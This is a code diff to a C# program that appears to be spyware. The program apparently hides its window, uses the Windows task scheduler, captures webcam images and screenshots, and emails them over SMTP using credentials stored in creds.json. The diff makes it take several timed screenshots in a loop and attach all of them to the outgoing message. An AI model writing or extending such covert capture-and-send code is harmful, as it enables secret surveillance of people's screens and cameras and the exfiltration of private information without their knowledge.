@@ -10,6 +10,7 @@ using Microsoft.Win32.TaskScheduler;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using Newtonsoft.Json;
+using System.Threading;
 
 namespace email
 {
@@ -31,6 +32,8 @@ namespace email
         static bool camCapture;
         static int cameraID;
         static bool screenshot;
+        static int shotDelay;
+        static int numberofShots;
         static void Main(string[] args)
         {
             IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
@@ -69,7 +72,10 @@ namespace email
             }
             if (screenshot)
             {
-                msg.Attachments.Add(new Attachment(secondattachmentName));
+                for (int i = 0; i < numberofShots; i++)
+                {
+                    msg.Attachments.Add(new Attachment($"{System.AppContext.BaseDirectory}screenshot{i}.jpg"));
+                }
             }
             //set smtp credentials and port
             SmtpClient client = new SmtpClient(emailSMTP) { 
@@ -106,11 +112,14 @@ namespace email
         }
         private static void takeScreenShot()
         {
-            var captureBmp = new Bitmap(1920, 1024, PixelFormat.Format32bppArgb);
-            using (var captureGraphic = Graphics.FromImage(captureBmp))
-            {
-                captureGraphic.CopyFromScreen(0, 0, 0, 0, captureBmp.Size);
-                captureBmp.Save($"{System.AppContext.BaseDirectory}screenshot.jpg", ImageFormat.Jpeg);
+            for (int i = 0; i < numberofShots; i++) {
+                Thread.Sleep(shotDelay);
+                var captureBmp = new Bitmap(1920, 1024, PixelFormat.Format32bppArgb);
+                using (var captureGraphic = Graphics.FromImage(captureBmp))
+                {
+                    captureGraphic.CopyFromScreen(0, 0, 0, 0, captureBmp.Size);
+                    captureBmp.Save($"{System.AppContext.BaseDirectory}screenshot{i}.jpg", ImageFormat.Jpeg);
+                }
             }
         }
         //read data from creds.json
@@ -131,6 +140,8 @@ namespace email
                 camCapture = creds.capture;
                 cameraID = creds.cameraID;
                 screenshot = creds.screenshot;
+                shotDelay = creds.shotdelay;
+                numberofShots = creds.numberofshots;
             }
         } 
     }
